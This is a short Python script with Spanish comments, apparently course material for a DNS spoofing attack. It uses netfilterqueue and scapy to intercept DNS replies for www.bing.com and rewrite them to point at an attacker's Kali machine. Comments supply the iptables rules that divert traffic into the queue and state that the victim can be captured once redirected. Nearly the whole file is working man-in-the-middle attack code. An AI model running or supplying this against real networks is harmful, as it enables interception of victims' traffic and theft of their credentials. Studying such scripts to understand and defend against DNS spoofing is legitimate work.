432#!/usr/bin/env python
# Para que funcione necesitamos crear la regla en IPTABLES: iptables -I FORWARD -j NFQUEUE --queue-num 0
# Para que funcione en nuesta compu (pruebas):  iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Para que funcione en nuesta compu (pruebas):  iptables -I INPUT -j NFQUEUE --queue-num 0
# Siempre luego: iptables --flush

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
#En este punto nuestro programa redirige a la persona de la url que pidieron a nuestro servidor donde podemos capturar lo que queramos.
            answer = scapy.DNSRR(rrname=qname, rdata="IP Kali")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

